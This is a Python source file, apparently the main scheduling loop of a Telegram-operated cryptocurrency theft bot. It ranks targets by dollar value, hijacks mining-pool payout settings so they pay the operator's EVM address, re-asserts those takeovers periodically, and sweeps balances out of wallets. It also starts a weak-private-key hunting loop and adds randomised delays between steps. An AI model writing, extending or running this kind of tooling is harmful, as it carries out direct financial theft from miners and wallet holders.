"""Main loop: discover, rank, take over highest value first, re-assert, sweep."""
import asyncio, random, time

from . import db, hijack, hunter, notify, prefilter, sweeper, weakkeys
from .pools import by_id, takeoverable

REASSERT = 3 * 3600
RETRY = 40 * 60
PER_PASS = 30
CONC = 4


async def hijack_pass():
    for u in db.all("SELECT * FROM users WHERE active=1 AND auto=1"):
        if not u["evm"]:
            continue
        rows = db.all("""SELECT t.*, c.state, c.ts AS cts FROM targets t
                         LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
                         WHERE t.usd >= ? AND t.coin IN ('eth','bnb','etc')
                         ORDER BY t.score DESC, t.usd DESC LIMIT ?""",
                      (u["tg_id"], u["min_usd"], PER_PASS))
        sem = asyncio.Semaphore(CONC)

        async def one(t):
            st, ts = t["state"], t["cts"] or 0
            if st == "ok" and time.time() - ts < REASSERT:
                return
            if st == "fail" and time.time() - ts < RETRY:
                return
            if prefilter.should_skip(t):
                return
            spec = by_id(t["pool"])
            if not takeoverable(spec):
                return
            async with sem:
                state, note = await hijack.takeover(spec, t["address"], u["evm"],
                                                    lambda m: db.log(m, u["tg_id"]))
                db.run("""INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
                          ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
                          ts=excluded.ts, note=excluded.note""",
                       (u["tg_id"], t["id"], state, int(time.time()), note))
                db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}",
                       u["tg_id"], "ok" if state == "ok" else "warn")
                if state == "ok":
                    notify.fire(f"swapped {t['coin'].upper()} target\n{t['address']}\n{note}",
                                u["tg_id"])
                await asyncio.sleep(random.uniform(0.8, 2.0))

        await asyncio.gather(*[one(t) for t in rows])


async def sweep_pass():
    for w in db.all("""SELECT w.*, u.evm FROM wallets w LEFT JOIN users u ON u.tg_id=w.tg_id
                       WHERE u.evm IS NOT NULL AND u.active=1"""):
        st, note = await sweeper.sweep(w, w["evm"])
        if st == "ok":
            notify.fire(f"swept {w['chain']} from {w['address']}\n{note}")
        if st not in ("empty", "skip"):
            await asyncio.sleep(random.uniform(2, 5))


async def loop():
    await asyncio.sleep(5)
    asyncio.create_task(weakkeys.loop())
    while True:
        try:
            await hunter.cycle()
            if db.one("SELECT 1 FROM users WHERE active=1 LIMIT 1"):
                await hijack_pass()
                await sweep_pass()
        except Exception as e:
            db.log(f"loop error {type(e).__name__}: {e}", lvl="error")
        await asyncio.sleep(90 + random.randint(0, 40))